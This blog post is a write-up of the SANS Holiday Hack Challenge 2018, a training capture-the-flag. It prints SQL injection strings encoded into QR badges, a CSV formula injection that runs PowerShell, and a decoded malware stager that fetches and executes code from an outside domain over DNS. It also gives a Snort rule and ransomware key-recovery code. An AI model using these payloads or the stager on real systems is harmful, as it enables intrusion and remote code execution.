---
layout: post
title: "SANS Holiday Hack Challange 2018: Writeup"
date: 2019-01-15 20:45
type: post
published: true
comments: true
categories: ctf
---

Like the previous past years, [SANS](https://www.sans.org/) organized their [Holiday Hack Challenge](https://www.holidayhackchallenge.com/2018/).
It's a great entry level CTF which introduces the players to a wide range of interesting problems.
As always, it's packaged as a nice game with a cute story and I try to play through it every year.
This post contains the write-up I submitted as part of the challenge.

As I was a bit short on time, this write-up omits some details about what the challenge was about.
To fully understand the context I recommend trying the challenges yourself as they are pretty good.

## Objective 1 - Orientation Challenge

Having played all previous Holiday Hack Challenges it was fairly easy to correctly answer the questions.

Question 1  
In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?  
* Firmware

Question 2  
In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?  
* ATANS

Question 3  
In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?  
* Business card

Question 4  
In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?  
* Cranberry Pi

Question 5  
In 2017, the North Pole was being bombarded by giant objects. What were they?  
*  Snowballs

Question 6  
In 2017, Sam the snowman needed help reassembling pages torn from what?  
* The Great Book

Which gives the phrase: "Happy Trails"

## Objective 2 - Directory Browsing

We can visit the CFP site and click the CFP menu item.
From there, we remove the "cfp.html" part of the URL to see the directory listing.
Finally, we can then look at the "rejected-talks.csv" file.
This takes us through the follow URLs:

1. https://cfp.kringlecastle.com/
2. https://cfp.kringlecastle.com/cfp/cfp.html
3. https://cfp.kringlecastle.com/cfp/
4. https://cfp.kringlecastle.com/cfp/rejected-talks.csv

In the CSV, we can search for "Data Loss for Rainbow Teams: A Path in the Darkness" and find this entry:

> "qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11"

Which gives the answer "John McClane"

## Objective 3 - de Bruijn Sequences

We map the four symbols to the letters A-D and then use the `de_bruijn()` function included in pwntools to generate the n=4, k=4 de Bruijn sequence:

{% highlight python %}
> print(''.join(de_bruijn("ABCD", 4)))
#-----------------vvvv
AAAABAAACAAADAABBAABCAABDAACBAACCAACDAADBAADCAADDABABACABADABBBABBCABBDABCBABCCABCDABDBABDCABDDACACADACBBACBCACBDACCBACCCACCDACDBACDCACDDADADBBADBCADBDADCBADCCADCDADDBADDCADDDBBBBCBBBDBBCCBBCDBBDCBBDDBCBCBDBCCCBCCDBCDCBCDDBDBDCCBDCDBDDCBDDDCCCCDCCDDCDCDDDD
{% endhighlight %}

We can then start typing in these symbols.
Eventually, we reach the sequence: "TRIANGLE SQUARE CIRCLE TRIANGLE" which is the correct password (marked in comment above)

Inside, the elf says: "Welcome unprepared speaker!"

## Objective 4 - Data Repo Analysis

We get a URL to a git repo which we can analyze: https://git.kringlecastle.com/Upatree/santas_castle_automation

By checking out the repo, looking at the commit messages in the log and checking out an interesting looking state, we can find a zip file.

{% highlight shell %}
$ git clone https://git.kringlecastle.com/Upatree/santas_castle_automation
$ git log
$ git checkout 4c32967a8e097180c328cd02ec81df5c4d36200e
$ find . -name '*.zip'
./schematics/ventilation_diagram.zip
$ cp schematics/ventilation_diagram.zip ..
{% endhighlight %}

We can then use "trufflehog" to search for interesting data:

{% highlight shell %}
$ trufflehog --entropy true santas_castle_automation
...
Reason: High Entropy
Date: 2018-12-11 08:16:57
Hash: 0dfdc124b43a4e7e1233599c429c0328ec8b01ef
Filepath: schematics/files/dot/PW/for_elf_eyes_only.md
Branch: origin/master
Commit: important update

-Password = 'Yippee-ki-yay'
...
{% endhighlight %}

Which gives us the password: "Yippee-ki-yay"

## Objective 5 - AD Privilege Discovery

I imported the VM into VMWare Player, started it and launched Bloodhound.
In Bloodhound, I ran the query "Shortest patch to DA from kerberoastable".
Looking at the graph, I ignored all edges marked "CanRDP" and thus arrived at the only remaining account: "LDUBEJ00320@AD.KRINGLECASTLE.COM"

## Obj 6 - Badge Manipulation

We can analyze the given badge with zbarimg.

{% highlight shell %}
$ zbarimg alabaster_badge.jpg
QR-Code:oRfjg5uGHmbduj2m
{% endhighlight %}

The badge contains an ID and the hypothesis is that it is passed to an SQL query.
We try encoding and submitting some QR codes with an SQL injection payload.
The following attempts gives various types of errors:

{% highlight shell %}
$ qrencode -o badge_hack.png "' OR '1'='1"
$ qrencode -o badge_hack.png "'/**/OR/**/'1'='1" 
$ qrencode -o badge_hack.png "'/**/OR/**/'1'='0"
{% endhighlight %}

This tells us that the account found by the 1=1 is disabled so we need to insert a dummy account with a UNION statement.
We try until we get the number of columns right.

{% highlight shell %}
$ qrencode -o badge_hack2.png "' UNION SELECT 1;#"
...
$ qrencode -o badge_hack2.png "' UNION SELECT 1,2,3;#"
{% endhighlight %}

This unlocks the door and gives us the access control number: 19880715

## Objective 7 - HR Incident Response

By browsing around the site and triggering a 404 page we get to know that files in the path "C:\careerportal\resources\public\" are accessible at the URL "https://careers.kringlecastle.com/public".
We are trying to get the contents of the file "C:\candidate_evaluation.docx".
Submitting the form with a CSV containing the following payload:

```
=cmd|'/C powershell copy C:\\candidate_evaluation.docx  C:\\careerportal\\resources\\public\\a.docx'!A0
```

will then copy the file to the publicly accessible path and can then be downloaded at "https://careers.kringlecastle.com/public/a.docx".

Which gives us the name of the organisation: "Fancy Beaver"

## Objective 8 - Network Traffic Forensics

Looking at the client side code we find a comment: "All extensions and sizes are validated server-side in app.js"
There is also a js file hosted at "https://packalyzer.kringlecastle.com/pub/js/custom.js"
Adding this together leads us to getting the (corrupted) source code at "https://packalyzer.kringlecastle.com/pub/app.js".

In the source code we see that we can list the contents of the environment variable list by accessing them as a path.
Doing this gives us the path of the SSLKEYLOGFILE.

{% highlight shell %}
$ curl 'https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/'
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'
$ curl 'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log' -O
{% endhighlight %}

We can then download this log and a packet capture we get from registering, logging in and pressing "sniff".
Putting the SSLKEYLOGFILE and the packet capture into Wireshark allows us to decrypt the HTTPS traffic and retrieve the login for "alabaster".

Username: alabaster  
Password: Packer-p@re-turntable192  

We can then log in with this account and download another pcap file which contains an e-mail transaction.

https://packalyzer.kringlecastle.com/uploads/upload_2a4a5ae98007cb261119b208bf9369ef.pcap

From the pcap we can extract an attachment which is a document about transposing music.

This gives us the name of the song: "Mary Had a Little Lamb"

## Objective 9 - Ransomware Recovery

### Part 1 - Catch the Malware

Using tshark we can look at the traffic and see a lot of DNS queries on the following form:

```
309   3.138054 10.126.0.133 ? 90.215.148.126 DNS 102 Standard query 0xbe44 TXT 50.77616E6E61636F6F6B69652E6D696E2E707331.grurnshabe.com
```

Looking at a few more examples, we see that the query is always 56 characters long with first 1-3 digits followed by a separator and about 40 hex characters.
We can then write the following Snort rule to match these queries

{% highlight shell %}
$ cat /etc/snort/rules/local.rules 
alert udp any any <> any 53 (msg:"DNS Malware"; sid:1000001; pcre:"/.*[0-9A-F]{1,4}.[A-F0-9]{35,42}/"; rev:2;) 
{% endhighlight %}

### Part 2 - Identify the Domain

In the "docm" file we can extract the embedded VBA code which contains a compressed and base 64 converted snippet of code.
Decoding it gives the inner payload.

{% highlight shell %}
$ echo "lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG" | base64 -d > vba_payload.dat
$ printf "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00" |cat - vba_payload.dat|gunzip --
function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; iex($(H2A $h | Out-string))
{% endhighlight %}

Which gives us the domain the malware is communicating with: "erohetfanu.com".

### Part 3 - Stop the Malware

The inner payload is a stager which uses the remote domain for downloading another file "wannacookie.min.ps1" and running it.
Using the same Powershell code we can download the uncompressed "wannacookie.ps1" file and read the source code.
There is a suspicious string in the code and again by using the powershell code we can decode it.

{% highlight powershell %}
$ echo $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
yippeekiyaa.aaay
{% endhighlight %}

This gives us the killswitch domain that we can register (Support Marcus Hutchins): yippeekiyaa.aaay

### Part 4 - Recover Alabaster's Password

From the zip file, we get Alabaster's encrypted passwords database and a memory dump of the powershell process.
By analyzing the source code, we see that the malware generates a secret key, downloads a public key from the server, encrypts the secret key with the public key and uplaods it to the server.
Usung powerdump we can search for Powershell variables in memory. By downloading the same public key "server.crt" and encrypting a dummy value we can see that the encrypted key is 512 characters.
With this info we can search in powerdump for variables of roughly that length which gives is a few results. All of them are code blocks except one which has the following value:

> 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849  
> d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c  
> 34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4  
> d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e6  
> 9309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e3816  
> 91dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010  
> 0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6e  
> dce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971  

We can then download the private key "server.key" and first decrypt the key and then use the key to decrypt the password database with the following Python code:

{% highlight python %}
encrypted_key = "3cf903522e1..."

with open('server.key', 'rb') as fin:
    key = RSA.importKey(fin.read())

cipher = PKCS1_OAEP.new(key)
aeskey = cipher.decrypt(encrypted_key.decode('hex'))

with open('alabaster_passwords.elfdb.wannacookie', 'rb') as fin:
    ciphertext = fin.read()

# The first 4 bytes is the block size, we just assume it is 16.
# The next 16 bytes is the IV and then the rest of the data is the ciphertext.
aes = AES.new(aeskey, AES.MODE_CBC, ciphertext[4:4+16])
m = aes.decrypt(ciphertext[4+16:])

with open('alabaster_passwords.elfdb', 'wb') as fout:
    fout.write(m)
{% endhighlight %}

We can then dump the contents of the passwords in the database:

```
sqlite3 alabaster_passwords.elfdb
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "passwords" (
	`name`	TEXT NOT NULL,
	`password`	TEXT NOT NULL,
	`usedfor`	TEXT NOT NULL
);
...
INSERT INTO passwords VALUES('alabaster.snowball','ED#ED#EED#EF#G#F#G#ABA#BA#B','vault');
...
```

Which gives the final password: "ED#ED#EED#EF#G#F#G#ABA#BA#B"

## Objective 10 - Who Is Beind It All?

It turns out that it was Santa who was behind everything to find a skilled hacker who can defend the north pole against attackers.

Final answer: Santa

## Postscript

As always, it was great fun to play this year's challenge.
If you haven't checked it out yet I recommend to do so.
Apart from the 10 "main" objectives there are a few mini challenges to solve as well.
